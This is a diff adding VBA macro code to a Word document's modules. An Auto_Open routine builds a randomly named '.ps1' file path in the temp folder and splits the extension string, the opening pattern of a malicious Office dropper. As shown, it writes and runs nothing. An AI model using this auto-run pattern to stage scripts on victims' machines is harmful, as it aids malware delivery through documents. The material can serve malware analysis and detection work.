@@ -1,0 +1,19 @@
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+
+Attribute VB_Name = "Module1"
+Sub Auto_Open()
+spath = Environ("temp") & "\": i = 0
+Do
+spath = spath & Chr(Int(Rnd * 26) + 97): i = i + 1
+Loop Until i > 12
+spath = spath & ".p" & "s1"
+
+End Sub
+
